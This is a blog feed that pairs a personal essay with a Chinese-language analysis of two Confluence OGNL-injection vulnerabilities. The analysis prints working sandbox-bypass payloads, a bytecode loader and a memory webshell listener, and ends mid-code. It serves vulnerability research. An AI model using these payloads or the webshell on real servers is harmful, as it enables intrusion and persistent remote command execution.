<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://theoyu.top/feed.xml" rel="self" type="application/atom+xml" /><link href="https://theoyu.top/" rel="alternate" type="text/html" /><updated>2022-10-29T14:09:54+08:00</updated><id>https://theoyu.top/feed.xml</id><title type="html">Theoyu</title><subtitle>Be cool,but also be warm.
</subtitle><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><entry><title type="html">告别北京</title><link href="https://theoyu.top/2022/essay/leaveBJ" rel="alternate" type="text/html" title="告别北京" /><published>2022-07-29T00:00:00+08:00</published><updated>2022-07-29T00:00:00+08:00</updated><id>https://theoyu.top/2022/essay/leaveBJ</id><content type="html" xml:base="https://theoyu.top/2022/essay/leaveBJ"><![CDATA[<!--more-->

<p>大一的时候，我最喜欢听的歌就是那吾克热的『 飘向北方 』。记得有一次被教官点上去表演才艺，我一时头热，就选择清唱了这首，那场面，你可以想想多尴尬。不过意外的是效果好像还行，至少我室友是这么说的。</p>

<p>在这篇文章起笔时，我是不想去牵及太多工作相关的事情，但后来看到网上很多关于这家公司一票否决的负面评价，我还是想说公司的价值观也好，外面人的评价也好，但直接决定的还是你的部门，不同部门之间千差万别，有的部门用所谓的『 工时排名 』来恶性竞争，在在我们部门完全不存在这样的情况。</p>

<p>我是在北京疫情最严重的时候来的西城（少数几个疫情不严重的区），并且在我来北京的前一天我租的房子的地区升级为高风险，住了几天宾馆后好在几个姐姐哥哥收留了我，一起合租。这里说一下短期租房的话最好不要找第三方中介（58同城、安居客、自如等等），因为这里大部分房子是不支持短租的，强行短租的话还要多支付一个月的违约费，并且服务费也很高。在学长的建议下我加了很多北京租房群、小程序等等找房子，最后我都没想到是在小红书找到了归宿 …</p>

<p>也是疫情的原因，第一周整个部门只有我和学长两个人在（学长住的比较近），每天下午学长就会带我去散步（摸鱼），和我介绍公司周围的环境，后来陆陆续续有其他前辈到岗，学长就会每天拉几个人和我一起散步，彼此介绍熟悉。前辈们也非常友好，让我不要有任何顾虑，做想做的就行。</p>

<p>Mentor <a href="https://github.com/Mochazz">Mochazz</a> 是一个非常温柔细心的师傅，对于技术上的问题我经常会死磕到底，但他都会不厌其烦的和我讲解。同时在隔壁工位还见到了偶像 <a href="https://github.com/c0ny1">C0ny1</a> ，也是十分平易近人。我意识到这些大哥其实和我们一样，无非是有自己的想法、在工作的时候更加专注认真，会在休闲的时间里健身、享受生活。显然我还没有学会这一点，或许这是未来长期的一个阶段我所需要去学习的。</p>

<p>总的来说这是一份很棒的工作，无论是从工作内容和工作氛围上，还是从未来的成长上。在这里我没有看到所谓的 push 和压榨，只有友善和最纯粹的热爱。希望有一天我也能成为细心负责的 mentor，以温柔和善意对待每一位求学者。</p>

<p>离开的前一天佳奕带我逛了逛北京，从天安门到海洋公园，从早上十点到晚上十一点，我真没想到两个男生可以聊这么久。关于工作，虽然我俩处于差别比较大的领域，但都可以通过彼此的专业知识去了解，理会相关的技术；关于生活，大多数观点我们都是相通的，基本上一个眼神就能明白彼此想要表达的意思；但是说到未来，我犹豫了。<del>以下删去无数我的无病呻吟</del>… 或许我能做到的就是在北京的日子里，尽可能去享受它所给我带来的便利，仅此而已。</p>

<p>『 海洋的生物，他们活着的意义是什么呢 ？』佳奕问我，但我没能回答上。</p>

<p><img src="../../assets/images/image-20220731115655863.png" alt="image-20220731115655863" /></p>

<p><img src="../../assets/images/image-20220731115727516.png" alt="image-20220731115727516" /></p>

<p>『 知足的快乐其实才是永久 。』这是最后佳奕留的言。</p>

<p>未来是怎么样？谁知道呢，做好当下吧。</p>

<p><strong>So , Where is the next station?</strong></p>]]></content><author><name>Theoyu</name></author><category term="essay" /><category term="essay" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Confluence 漏洞分析</title><link href="https://theoyu.top/2022/codeaudit/Confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" rel="alternate" type="text/html" title="Confluence 漏洞分析" /><published>2022-06-08T00:00:00+08:00</published><updated>2022-06-08T00:00:00+08:00</updated><id>https://theoyu.top/2022/codeaudit/Confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</id><content type="html" xml:base="https://theoyu.top/2022/codeaudit/Confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><![CDATA[<p>FROM CVE-2021-26084 TO  CVE-2022-26134 ,Bypass Sandbox And Inject Memory Shell</p>

<!--more-->

<h2 id="cve-2021-26084">CVE-2021-26084</h2>

<ul>
  <li>Confluence &lt; 6.13.23</li>
  <li>6.14.0 ≤ Confluence &lt; 7.4.11</li>
  <li>7.5.0 ≤ Confluence &lt; 7.11.6</li>
  <li>7.12.0 ≤ Confluence &lt; 7.12.5</li>
  <li>Confluence &lt; 7.13.0</li>
</ul>

<p>之前对struts2框架了解的比较少，站在漏洞复现的角度梳理一下：</p>

<h3 id="velocity模板引擎">velocity模板引擎</h3>

<p>confluence使用velocity模版引擎，处理vm文件时，会把vm内容转化为AST语法树，然后分别处理每一个结点的内容，把结果输出。这个过程我理解有一点像sql预编译，提前确定好位置，再提取对应的键值对解析，最后渲染到前端展示。</p>

<p>我们先发一个poc包：</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/pages/createpage-entervariables.action</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">ty.com:8090</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">47</span>

queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027
</code></pre></div></div>

<p>转化后到AST可以在 <strong>org.apache.velocity.Template</strong> 下的<strong>data</strong>属性查看：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164131.png" alt="image-20220608172206591" /></p>

<p>搜索子树，可以定位 <strong>queryString</strong>：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164139.png" alt="image-20220608172118978" /></p>

<p>确定好模版之后，就是获取 <code class="language-plaintext highlighter-rouge">pages/createpage-entervariables.vm</code> 标签中所定义的变量：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164142.png" alt="image-20220608190418386" /></p>

<p>其中的velocity基本语法：</p>

<pre><code class="language-txt">"#" : 标识velocity的脚本语句
"$" : 获取一个对象或变量
"!" : 对变量为null的情况在页面显示为空白字符串
</code></pre>

<p>在<code class="language-plaintext highlighter-rouge">AbstractTagDirective.createPropertyMap()</code>下创建了一个map，用于保存tag中的键值对：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164150.png" alt="image-20220608200447599" /></p>

<p>之后进入<code class="language-plaintext highlighter-rouge">processTag()</code>方法，用于处理tag：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164154.png" alt="image-20220608232231071" /></p>

<p>在<code class="language-plaintext highlighter-rouge">processTag()</code>的末尾，调用了<code class="language-plaintext highlighter-rouge">doEndTag()</code>方法，跟进<code class="language-plaintext highlighter-rouge">evaluateParams(stack)</code>，其实就是用Ognl表达式去处理tag中的内容。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164157.png" alt="image-20220608234226356" /></p>

<p>可以看到在执行Ognl表达式之前，还经过了一次表达式检查，这个我们放在后面说，需要注意的是我们的expr是被<code class="language-plaintext highlighter-rouge">''</code>所包裹的，所以Ognl并不会解析里面的内容，而在执行之前expr会经过一轮<code class="language-plaintext highlighter-rouge">OgnlUtil.compile(expr)</code>，支持对unicode编码的解码，所以可以利用<code class="language-plaintext highlighter-rouge">\u0027</code>闭合单引号 。</p>

<h3 id="安全检测">安全检测</h3>

<p>首先<code class="language-plaintext highlighter-rouge">Ognl.getValue()</code> 解析 Ongl语句，就会将其转化为一颗 ASTChain 语法树执行，比如表达式：<code class="language-plaintext highlighter-rouge">@java.lang.Runtime@getRuntime().exec("calc")</code>，下图为其所对应的语法树：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164205.png" alt="image-20220609104544611" /></p>

<p>现在看安全防护的问题：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164212.png" alt="" /></p>

<p>针对以上检测，有以下两种方式绕过检测以获取Class对象：</p>

<h4 id="绕过一">绕过一</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>queryString=\u0027%2b{Class}%2b\u0027
等于
{Class}
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164215.png" alt="image-20220610001758198" /></p>

<p>当Ongl解析一个属性 <strong>a</strong>  或者 <strong>A</strong>时，都会从  Context 键值对中调用 <code class="language-plaintext highlighter-rouge">getA</code> 来尝试获取属性，而检测中只过滤了小写<strong>class</strong>的情况，我们完全可以利用大写 <strong>Class</strong> 属性来调用context中的 <code class="language-plaintext highlighter-rouge">getClass()</code> 方法从而获取Class对象。</p>

<h4 id="绕过二">绕过二</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>queryString=\u0027%2b{[\u0022class\u0022]}%2b\u0027
等于
{['class']}
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164222.png" alt="image-20220610003243339" /></p>

<p>这一绕过也是利用Ognl在解析时的差异，针对 <code class="language-plaintext highlighter-rouge">['class']</code> 属性，是和 <code class="language-plaintext highlighter-rouge">.class</code> 一样都可以调用到<code class="language-plaintext highlighter-rouge">getClass()</code>方法，而在检测时是调用被测属性的<code class="language-plaintext highlighter-rouge">toString</code>方法，而<code class="language-plaintext highlighter-rouge">['class']</code> 相当于返回自身，故绕过了检测。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164225.png" alt="image-20220610004326852" /></p>

<p>拿到Class对象之后，利用就好说了，利用forName就可以调用各种方法。</p>

<h2 id="cve-2022-26134">CVE-2022-26134</h2>

<ul>
  <li>1.3.0 ≤  Confluence &lt; 7.4.17</li>
  <li>7.13.0 ≤  Confluence &lt; 7.13.7</li>
  <li>7.14.0 ≤  Confluence &lt; 7.14.3</li>
  <li>7.15.0 ≤  Confluence &lt; 7.15.2</li>
  <li>7.16.0 ≤  Confluence &lt; 7.16.4</li>
  <li>7.17.0 ≤  Confluence &lt; 7.17.4</li>
  <li>7.18.0 ≤  Confluence &lt; 7.18.1</li>
</ul>

<p>CVE-2022-26134的 Ognl 输入点在url处，confluence的分发器会把请求交给内部28个拦截器（interceptors）处理，</p>

<p>其中大部分拦截器在处理时，又会回到<code class="language-plaintext highlighter-rouge">invocation.invoke()</code>方法，形成一个循环：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164230.png" alt="image-20220613030021374" /></p>

<p>但是第10号拦截器 <strong>actionAccessChecker</strong> 不一样，其判断了请求的action，并默认返回 <strong>notpermitted</strong>，从而跳出了循环：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164234.png" alt="image-20220613023859251" /></p>

<p>跳出后，走到<code class="language-plaintext highlighter-rouge">this.execteResult()</code>:</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164239.png" alt="image-20220613024215763" /></p>

<p>之后一路跟进，进入最后的执行点<code class="language-plaintext highlighter-rouge">TextParseUtil.translateVariables(this.namespace, stack)</code>，这里对 <strong>namespace</strong> (在转发器 ServletDispatcher 对url做的提取) 进行了ognl表达式处理：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164243.png" alt="image-20220613030947118" /></p>

<p>同样还有熟悉的<code class="language-plaintext highlighter-rouge">safeExpressionUtil.isSafeExpression(expr)</code>, confluence 在7.13.0之后改写了这个模块，引入了更加复杂的黑名单以及白名单机制：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//unsafePropertyNames

0 = "sun.misc.Unsafe"
1 = "classLoader"
2 = "java.lang.System"
3 = "java.lang.ThreadGroup"
4 = "com.opensymphony.xwork.ActionContext                 java.lang.Compiler"
5 = "com.atlassian.applinks.api.ApplicationLinkRequestFactory"
6 = "java.lang.Thread"
7 = "com.atlassian.core.util.ClassLoaderUtils"
8 = "java.lang.ProcessBuilder"
9 = "java.lang.InheritableThreadLocal"
10 = "com.atlassian.core.util.ClassHelper"
11 = "class"
12 = "java.lang.Shutdown"
13 = "java.lang.ThreadLocal"
14 = "java.lang.Process"
15 = "java.lang.Package"
16 = "org.apache.tomcat.InstanceManager"
17 = "java.lang.Runtime"
18 = "javax.script.ScriptEngineManager"
19 = "javax.persistence.EntityManager"
20 = "org.springframework.context.ApplicationContext"
21 = "java.lang.SecurityManager"
22 = "java.lang.Object"
23 = "java.lang.Class"
24 = "java.lang.RuntimePermission"
25 = "javax.servlet.ServletContext"
26 = "java.lang.ClassLoader"

//unsafePackageNames

0 = "java.rmi"
1 = "sun.management"
2 = "org.apache.catalina.session"
3 = "java.jms"
4 = "com.atlassian.confluence.util.io"
5 = "com.google.common.reflect"
6 = "javax.sql"
7 = "java.nio"
8 = "com.atlassian.sal.api.net"
9 = "sun.invoke"
10 = "java.util.zip"
11 = "liquibase"
12 = "com.hazelcast"
13 = "org.apache.commons.httpclient"
14 = "com.atlassian.util.concurrent"
15 = "java.net"
16 = "freemarker.ext.jsp"
17 = "com.sun.jna"
18 = "net.java.ao"
19 = "javax"
20 = "sun.corba"
21 = "org.springframework.util.concurrent"
22 = "com.sun.jmx"
23 = "sun.misc"
24 = "javassist"
25 = "ognl"
26 = "org.apache.commons.exec"
27 = "com.atlassian.cache"
28 = "org.wildfly.extension.undertow.deployment                 java.lang.reflect"
29 = "io.atlassian.util.concurrent"
30 = "java.util.concurrent"
31 = "com.atlassian.confluence.util.http"
32 = "sun.tracing"
33 = "org.objectweb.asm"
34 = "freemarker.template"
35 = "net.sf.hibernate"
36 = "freemarker.core"
37 = "net.bytebuddy"
38 = "org.apache.tomcat"
39 = "freemarker.ext.rhino"
40 = "com.atlassian.media"
41 = "org.springframework.context"
42 = "org.apache.velocity"
43 = "javax.xml"
44 = "java.sql"
45 = "sun.reflect"
46 = "sun.net"
47 = "javax.persistence"
48 = "org.javassist"
49 = "javax.naming"
50 = "org.apache.httpcomponents.httpclient"
51 = "com.atlassian.hibernate"
52 = "sun.nio"
53 = "com.atlassian.confluence.impl.util.sandbox"
54 = "com.google.common.net"
55 = "com.atlassian.filestore"
56 = "org.apache.commons.io"
57 = "com.atlassian.vcache"
58 = "jdk.nashorn"
59 = "sun.launcher"
60 = "oshi"
61 = "org.apache.bcel"
62 = "sun.rmi"
63 = "sun.tools.jar"
64 = "org.springframework.expression.spel"
65 = "com.opensymphony.xwork.util"
66 = "org.ow2.asm"
67 = "com.atlassian.confluence.setup.bandana"
68 = "org.quartz"
69 = "net.sf.cglib"
70 = "com.atlassian.activeobjects"
71 = "com.atlassian.utils.process"
72 = "sun.security"
73 = "com.atlassian.quartz"
74 = "javax.management"
75 = "sun.awt.shell"
76 = "com.google.common.cache"
77 = "org.apache.http.client"
78 = "java.io"
79 = "com.atlassian.confluence.util.sandbox"
80 = "java.util.jar"
81 = "com.atlassian.scheduler"
82 = "sun.print"
83 = "com.atlassian.failurecache"
84 = "com.google.common.io"
85 = "org.apache.catalina.core"
86 = "org.ehcache"

//unsafeMethodNames

0 = "getClass"
1 = "getClassLoader"

//allowedClassNames

0 = "net.sf.hibernate.proxy.HibernateProxy"
1 = "java.lang.reflect.Proxy"
2 = "net.java.ao.EntityProxyAccessor"
3 = "net.java.ao.RawEntity"
4 = "net.sf.cglib.proxy.Factory"
5 = "java.io.ObjectInputValidation"
6 = "net.java.ao.Entity"
7 = "com.atlassian.confluence.util.GeneralUtil"
8 = "java.io.Serializable"
</code></pre></div></div>

<p>为什么会引入白名单呢？因为13之后的 <code class="language-plaintext highlighter-rouge">UNSAFE_NODE_TYPES</code> 允许了 <strong>ognl.ASTStaticMethod</strong>  类型的节点，不过把可以调用的类限制在了白名单内：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164250.png" alt="image-20220613110143920" /></p>

<h3 id="绕过踩坑">绕过踩坑</h3>

<p>网上已经公开了许多exp，这里主要说一下我在复现的时候踩的一些坑：</p>

<p>这是github star比较多的<a href="https://github.com/Nwqda/CVE-2022-26134/blob/master/cve-2022-26134.py">exp</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
</code></pre></div></div>

<p>看到我就感觉挺奇怪的，因为在CVE-2021-26084的检测中就已经把赋值语句给禁止了，并且即使调用静态方法 <strong>org.apache.commons.io.IOUtils</strong> 也不在白名单内：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164348.png" alt="image-20220613105853012" /></p>

<p>后来才知道网上流传比较广泛的大多都是针对还没有沙箱的版本（7.4 以下），实际上在7.18版本 confluence都还没能把大写 <strong>Class</strong> 加入到 unsafePropertyNames 中，所以我们还是可以通过<code class="language-plaintext highlighter-rouge">${Class.forName()}</code>拿到Class对象：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//javax.script.ScriptEngineManager 在黑名单中，
${(Class.forName('jav'+'ax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec("open -a Calculator")'))}
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">OgnlUtil.compile(expr)</code>会将expr中的单引号变成双引号，不过在引号内的符号会默认加上<code class="language-plaintext highlighter-rouge">\</code>，不会被闭合。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${(Class.forName('jav'+'ax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec("whoami").getInputStream())'))}
</code></pre></div></div>
<p>Phith0n采用的是JavaScript的String.fromCharCode来避免引号相关的问题。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("eval(String.fromCharCode(118,97,114,32,115,61,39,39,59,118,97,114,32,112,112,32,61,32,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,105,100,39,41,46,103,101,116,73,110,112,117,116,83,116,114,101,97,109,40,41,59,119,104,105,108,101,32,40,49,41,32,123,118,97,114,32,98,32,61,32,112,112,46,114,101,97,100,40,41,59,105,102,32,40,98,32,61,61,32,45,49,41,32,123,98,114,101,97,107,59,125,115,61,115,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,98,41,125,59,115))")}
</code></pre></div></div>

<p>可以命令执行，那么后续就是拿回显的问题，</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${Class.forName('com.opensymphony.webwork.ServletActionContext').getMethod('getResponse',null).invoke(null,null).setHeader('X-CMD',Class.forName('jav'+'ax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec("whoami").getInputStream())'))}
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164355.png" alt="image-20220613165315157" /></p>

<h3 id="注入内存木马">注入内存木马</h3>

<p>能执行，有回显，离注入内存马就只差最后动态加载字节码了。</p>

<p>要想动态加载字节码，通过url进行get传输肯定不行，我们通过context对象拿到request属性从而提取Parameter属性：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//以下两种方式均可
${Class.forName('com.opensymphony.webwork.ServletActionContext').getMethod('getResponse',null).invoke(null,null).setHeader('X-CMD',Class.forName('jav'+'ax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(@com.opensymphony.webwork.ServletActionContext@getRequest().getParameter("theoyu")))}

${Class.forName('com.opensymphony.webwork.ServletActionContext').getMethod('getResponse',null).invoke(null,null).setHeader('X-CMD',Class.forName('jav'+'ax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(Class.forName('com.opensymphony.webwork.ServletActionContext').getMethod('getRequest',null).invoke(null,null).getParameter("theoyu")))}

theoyu=java.lang.Runtime.getRuntime().exec("open+-a+Calculator")

</code></pre></div></div>

<p>context在回显的时候已经解决了，现在是要找一个defineClass的点，</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var classBytes = java.util.Base64.getDecoder().decode("yv66vgAAADcAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAFTFJjZTsBAApFeGNlcHRpb25zBwAZAQAKU291cmNlRmlsZQEACFJjZS5qYXZhDAAHAAgHABoMABsAHAEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAHQAeAQADUmNlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAABAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAABAAEAAUADQAGAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAAAACABE=");
var loader = java.lang.Thread.currentThread().getContextClassLoader();
var reflectUtilsClass = java.lang.Class.forName("org.springframework.cglib.core.ReflectUtils",true,loader);
var defineClassMethod = reflectUtilsClass.getMethod("defineClass",java.lang.String.class,java.lang.Class.forName("[B"),java.lang.ClassLoader.class);
var o =  defineClassMethod.invoke(null,"Rce",classBytes,loader);
o.newInstance();
</code></pre></div></div>

<p>准备<code class="language-plaintext highlighter-rouge">ListenerShell</code> 和<code class="language-plaintext highlighter-rouge">AddListener</code></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ListenerShell</span> <span class="kd">implements</span> <span class="nc">ServletRequestListener</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestDestroyed</span><span class="o">(</span><span class="nc">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="nc">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">RequestFacade</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="nc">RequestFacade</span><span class="o">)</span> <span class="n">servletRequestEvent</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">();</span>
            <span class="nc">Field</span> <span class="n">requestField</span><span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"request"</span><span class="o">);</span>
            <span class="n">requestField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
            <span class="nc">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Request</span><span class="o">)</span> <span class="n">requestField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">req</span><span class="o">);</span>
            <span class="nc">Response</span> <span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getResponse</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">String</span><span class="o">[]</span> <span class="n">commands</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">String</span><span class="o">[</span><span class="mi">3</span><span class="o">];</span>
                <span class="nc">String</span> <span class="n">charsetName</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"window"</span><span class="o">)</span> <span class="o">?</span> <span class="s">"GBK"</span> <span class="o">:</span> <span class="s">"UTF-8"</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">(</span><span class="nc">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">).</span><span class="na">toUpperCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"WIN"</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">commands</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="s">"cmd"</span><span class="o">;</span>
                    <span class="n">commands</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="s">"/c"</span><span class="o">;</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                    <span class="n">commands</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="o">;</span>
                    <span class="n">commands</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="s">"-c"</span><span class="o">;</span>
                <span class="o">}</span>
                <span class="n">commands</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
                <span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">commands</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
                <span class="nc">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">,</span> <span class="n">charsetName</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\A"</span><span class="o">);</span>
                <span class="nc">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">close</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">AddListener</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="nf">AddListener</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
        <span class="kt">var</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"ListenerShell"</span><span class="o">);</span>
        <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">opensymphony</span><span class="o">.</span><span class="na">webwork</span><span class="o">.</span><span class="na">ServletActionContext</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">();</span>
